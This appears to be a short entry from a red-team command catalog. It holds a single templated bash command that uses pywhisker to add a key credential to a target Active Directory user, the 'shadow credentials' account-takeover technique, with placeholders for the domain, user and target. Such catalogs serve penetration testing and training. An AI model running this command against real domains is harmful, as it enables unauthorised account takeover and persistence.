---
id: 073ba3f1-2b76-40e1-acd7-4f51eacfbfff
name: Add a new key credential to the specified user
type: command
executor: bash
data: pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target
  "TARGET_SAMNAME" --action "add"
output: null
created_at: '2023-04-06T03:56:06.261767+00:00'
updated_at: '2023-04-10T20:26:09.591812+00:00'
---

# Add a new key credential to the specified user

```bash
pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "add"
```
